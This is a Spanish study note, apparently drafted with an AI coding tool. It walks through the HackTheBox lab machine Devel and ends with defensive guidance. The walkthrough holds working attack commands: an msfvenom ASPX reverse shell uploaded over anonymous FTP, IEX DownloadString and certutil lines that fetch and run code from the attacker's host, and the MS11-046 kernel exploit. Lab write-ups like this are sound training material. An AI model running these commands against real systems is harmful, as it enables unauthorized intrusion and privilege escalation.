---
title: Devel (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, windows, ftp, iis, webshell, aspx, kernel-exploit, privesc]
type: nota
status: en-progreso
source: claude-code
aliases: [HTB Devel, Devel HTB, devel hackthebox]
---

# Devel — HackTheBox (Easy)

**SO:** Windows · **Dificultad:** Easy · **Skills:** FTP anónimo, webshell ASPX, RCE sobre IIS, escalada de privilegios por kernel sin parchear (MS11-046)

Devel es una máquina Windows clásica que encadena dos vulnerabilidades independientes: un FTP anónimo con escritura sobre el webroot de IIS, y un kernel de Windows sin actualizar. Es ideal para entender el patrón "upload → RCE → local privesc" que aparece en entornos Windows reales mal configurados.

> HTB es un laboratorio de ciberseguridad **legal y autorizado**; todo lo aquí descrito aplica únicamente en ese entorno.

---

## Objetivo

Obtener ejecución remota de comandos como usuario de IIS (`iis apppool\web`) subiendo una webshell vía FTP anónimo, y escalar a `NT AUTHORITY\SYSTEM` explotando una vulnerabilidad de kernel en un Windows sin parchear. Capturar `user.txt` y `root.txt`.

---

## Acceso a la máquina (paso previo)

1. **Conectarse a la VPN de HTB** en una terminal que dejarás abierta durante toda la sesión:
   ```bash
   sudo openvpn lab_<usuario>.ovpn
   ```
2. En la web de HTB, busca la máquina **Devel** (sección "Retired Machines", requiere suscripción VIP) y pulsa **Spawn Machine**. HTB te asignará una IP dinámica del rango `10.10.10.x`.
3. Verifica conectividad antes de empezar:
   ```bash
   ping -c2 <IP>
   ```
4. A lo largo del writeup, sustituye `<IP>` por la IP que te haya asignado HTB. El Pwnbox (Kali en el navegador) ya viene conectado a la VPN.

---

## Reconocimiento

**Categoría:** escaneo de puertos y detección de servicios.

El primer paso es siempre mapear la superficie de ataque: qué puertos escucha la máquina y qué software corre en cada uno.

```bash
nmap -sC -sV -oN devel_nmap.txt <IP>
```

Salida relevante (simplificada):

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed
| ftp-syst: SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
```

**Hallazgos clave:**
- Puerto 21 — FTP con **login anónimo permitido** (`ftp-anon: Anonymous FTP login allowed`).
- Puerto 80 — **IIS 7.5** (Windows Server 2008 R2 / Windows 7 32-bit); la página por defecto es la bienvenida de IIS7.

---

## Enumeración

**Categoría:** exploración manual del FTP y correlación con el webroot de IIS.

Conecta al FTP como usuario `anonymous` (contraseña vacía o cualquier cadena):

```bash
ftp <IP>
# usuario: anonymous
# contraseña: (enter)
```

Dentro del FTP, lista los archivos:

```
ftp> ls
-r-xr-xr-x   iisstart.htm
-r-xr-xr-x   welcome.png
```

Estos son exactamente los archivos que sirve IIS en `http://<IP>/`. Conclusión: **el directorio FTP es el webroot de IIS**. Cualquier archivo que subas por FTP será accesible desde el navegador (o desde `curl`).

Comprueba que tienes permisos de escritura:

```bash
ftp> put test.txt
```

Si sube sin error, el vector de ataque está confirmado.

---

## Acceso inicial (foothold)

**Categoría:** upload de webshell ASPX → RCE → reverse shell.

**Patrón:** FTP anónimo escribible sobre el webroot → el servidor ejecuta código subido → shell remota.

### Paso 1 — Generar la webshell ASPX

IIS ejecuta código ASPX (ASP.NET). `msfvenom` puede generar un payload ASPX que, al ser solicitado por HTTP, conecta de vuelta a tu máquina:

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=<TU_IP_VPN> LPORT=4444 \
  -f aspx -o shell.aspx
```

- `-p windows/shell_reverse_tcp`: payload de shell inversa para Windows de 32 bits (sin Meterpreter, shell CMD directa).
- `-f aspx`: formato de salida; IIS lo interpretará como código ASP.NET.
- `LHOST`: tu IP en la interfaz `tun0` (VPN de HTB). Compruébala con `ip a show tun0`.

> El payload embebe una shellcode que abre una conexión TCP saliente desde la víctima hacia tu oyente. IIS la ejecuta en el contexto del pool de aplicación, no como Administrador.

### Paso 2 — Subir la webshell por FTP

```bash
ftp <IP>
ftp> put shell.aspx
ftp> bye
```

### Paso 3 — Abrir el oyente (listener)

```bash
nc -lvnp 4444
```

### Paso 4 — Activar la webshell

Visita la URL desde el navegador o con curl:

```bash
curl http://<IP>/shell.aspx
```

IIS procesa el ASPX, ejecuta el shellcode y abre la conexión inversa. En tu terminal con `nc` recibirás:

```
Microsoft Windows [Version 6.1.7600]
c:\windows\system32\inetsrv>
```

Eres **`iis apppool\web`** — el usuario de menor privilegio del pool de IIS.

---

## Escalada de privilegios

**Categoría:** kernel exploit local en Windows sin parchear (MS11-046 / `afd.sys`).

**Patrón:** el sistema no tiene actualizaciones aplicadas → hay exploits de kernel públicos que elevan desde usuario sin privilegios a `SYSTEM`.

### Identificar el sistema

```
c:\windows\system32\inetsrv> systeminfo
```

Busca la línea `OS Version` y `Hotfix(s)`. Si aparece `0 Hotfix(s) installed` o muy pocos, el sistema es vulnerable a múltiples exploits de kernel.

### Encontrar el exploit adecuado

**Herramienta 1 — Windows Exploit Suggester** (ejecutar desde tu Kali):

```bash
# Guardar la salida de systeminfo en un archivo
systeminfo > sysinfo.txt   # (en la shell de la víctima, redirigir)

# En Kali:
python windows-exploit-suggester.py --database 2014-01-03-mssb.xlsx \
  --systeminfo sysinfo.txt
```

**Herramienta 2 — Sherlock** (PowerShell, ejecutar en la víctima):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<TU_IP>:8000/Sherlock.ps1')
Find-AllVulns
```

Ambas herramientas señalan exploits como **MS11-046** (`afd.sys`, CVE-2011-1249), **MS10-059**, o **MS15-051**, entre otros, dependiendo del nivel de parcheo exacto. La máquina Devel es conocida por ser vulnerable a **MS11-046**.

> El detalle exacto del exploit que funciona puede variar; verifica contra la salida de `systeminfo` real de la máquina en vivo.

### Transferir y ejecutar el exploit

Descarga el binario precompilado de MS11-046 (disponible en repositorios públicos como `SecWiki/windows-kernel-exploits`):

```bash
# En Kali — servir el exploit:
python3 -m http.server 8000
```

```
# En la shell de la víctima — descargar:
c:\windows\system32\inetsrv> certutil -urlcache -f http://<TU_IP>:8000/MS11-046.exe C:\Temp\MS11-046.exe
C:\Temp\MS11-046.exe
```

```
C:\Temp> MS11-046.exe
```

**Qué hace MS11-046:** explota una condición de race condition en el driver `afd.sys` (Ancillary Function Driver for WinSock). Al manipular una llamada a `DeviceIoControl` con parámetros crafteados, sobreescribe el token de seguridad del proceso actual en memoria del kernel, reemplazándolo por el token de `SYSTEM`. El resultado es que el proceso hijo que lanza el exploit hereda privilegios `SYSTEM`.

Si el exploit tiene éxito, obtendrás:

```
c:\windows\system32> whoami
nt authority\system
```

---

## Flags

| Flag | Ubicación | Cómo llegar |
|------|-----------|-------------|
| `user.txt` | `C:\Users\babis\Desktop\user.txt` | Con la shell de IIS (`iis apppool\web`) ya tienes acceso de lectura |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` | Solo accesible después de escalar a `SYSTEM` |

```
type C:\Users\babis\Desktop\user.txt
<flag>

type C:\Users\Administrator\Desktop\root.txt
<flag>
```

> El nombre de usuario `babis` es el típico en esta máquina, pero confírmalo listando `C:\Users\` en tu shell.

---

## Patrón y teoría

Esta sección es la más importante: no importa solo cómo se explota, sino **por qué funciona y cómo se previene**.

### Cadena de ataque completa

```
FTP anónimo escribible
        ↓
  webroot = directorio FTP
        ↓
  upload de webshell ASPX
        ↓
  GET http://<IP>/shell.aspx  →  IIS ejecuta el código
        ↓
  shell como iis apppool\web  (usuario sin privilegios de dominio)
        ↓
  kernel sin parchear (MS11-046)
        ↓
  NT AUTHORITY\SYSTEM
```

### Patrón 1 — FTP anónimo escribible + webroot compartido

**Categoría de vulnerabilidad:** misconfiguration + insecure file upload.

El problema no es solo que FTP admita anónimos: es que el directorio FTP y el webroot de IIS son el **mismo path**. Subir un archivo por FTP equivale a publicarlo vía HTTP. Si el servidor interpreta esa extensión (`.aspx`, `.php`, `.jsp`...), el archivo se convierte en código ejecutable.

Este es el patrón **"upload to RCE"** y es uno de los más prevalentes en auditorías reales (ver [[04-seguridad-web-owasp]], categoría A03:2021 — Injection y A05:2021 — Security Misconfiguration).

**Para defenderse / diseñar bien:**
- FTP (si es necesario) debe apuntar a un directorio **separado del webroot**, nunca al mismo path.
- Deshabilitar FTP anónimo; usar SFTP/FTPS con autenticación por clave.
- El servidor web no debe ejecutar archivos en directorios de upload. Servir archivos subidos desde un dominio/path separado sin permisos de ejecución.
- Validar extensiones y Content-Type en el servidor (no en el cliente).

### Patrón 2 — Kernel sin parchear → escalada local

**Categoría de vulnerabilidad:** unpatched local privilege escalation (LPE).

Una vez dentro con un usuario sin privilegios, el atacante busca diferencia entre los privilegios actuales y `SYSTEM`. En Windows, los exploits de kernel (como MS11-046, MS10-059, MS15-051) operan directamente sobre estructuras del kernel en memoria para elevar el token de seguridad del proceso. No requieren credenciales: basta con ejecutar el binario desde cualquier usuario local.

Este paso es independiente del foothold: cualquier vector que dé acceso local a un usuario sin privilegios en un Windows sin parchear es escalable de esta forma.

**Para defenderse / diseñar bien:**
- **Política de parcheo agresiva**: aplicar actualizaciones de seguridad en un plazo máximo de 30 días tras su publicación. En entornos corporativos, usar WSUS/SCCM o equivalente en la nube.
- **Principio de mínimos privilegios para el pool de IIS**: el usuario del pool no debe tener acceso de escritura al sistema de archivos fuera del webroot, y nunca debe poder escalar. Esto no evita el LPE de kernel, pero sí limita el daño del foothold.
- **EDR / monitorización de integridad**: herramientas como Sysmon o un EDR moderno detectan la creación de procesos con tokens elevados inesperados.
- **Surface de ataque**: desactivar servicios innecesarios (FTP si no es imprescindible).

### Relevancia para desarrollo y purple team

Si diseñas una aplicación web que acepta subida de archivos:
1. Nunca sirvas los archivos subidos desde el mismo servidor que ejecuta tu aplicación.
2. Usa un bucket S3 / Azure Blob / almacenamiento separado con Content-Disposition: attachment y sin ejecución de código.
3. En el servidor de aplicación, el proceso web debe correr con el **mínimo privilegio necesario** y en un contenedor o cuenta sin acceso al sistema de archivos del SO.
4. Mantén el SO del servidor actualizado; un atacante que llega a tu proceso web no debe poder llegar al sistema operativo.

Ver también: [[06-seguridad-de-sistemas-y-hardening]].

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
- [[06-seguridad-de-sistemas-y-hardening]]
